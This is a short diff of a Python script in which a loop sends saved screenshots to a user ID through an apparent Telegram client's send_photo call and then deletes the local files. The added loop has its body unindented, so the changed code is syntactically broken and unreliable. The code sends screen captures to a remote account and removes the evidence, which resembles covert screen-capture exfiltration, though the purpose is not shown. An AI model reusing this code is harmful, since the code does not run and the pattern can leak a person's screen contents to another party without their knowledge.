@@ -120,11 +120,22 @@ def main():
     #    os.remove(screenshot_path)
     #    print("Screenshot deleted:", screenshot_file)
         
-    for screenshot_file in os.listdir("screenshots/"):
-        screenshot_path = os.path.join("screenshots/", screenshot_file)
+    #for screenshot_file in os.listdir("screenshots/"):
+    #    screenshot_path = os.path.join("screenshots/", screenshot_file)
+     #   app.send_photo(user_id, photo=screenshot_path, progress=progress)
+     #   os.remove(screenshot_path)
+     #   print("Screenshot sent and deleted:", screenshot_file)
+        
+    screenshot_directory = "screenshots/"
+    for i in range(10):  # Iterate from 0 to 9
+    screenshot_file = f"screenshot_{i}.jpg"
+    screenshot_path = os.path.join(screenshot_directory, screenshot_file)
+    
+    if os.path.exists(screenshot_path):  # Check if the screenshot file exists
         app.send_photo(user_id, photo=screenshot_path, progress=progress)
         os.remove(screenshot_path)
-        print("Screenshot sent and deleted:", screenshot_file)   
+        print("Screenshot sent and deleted:", screenshot_file)
+        
         
     stop_app()
 if __name__ == "__main__":
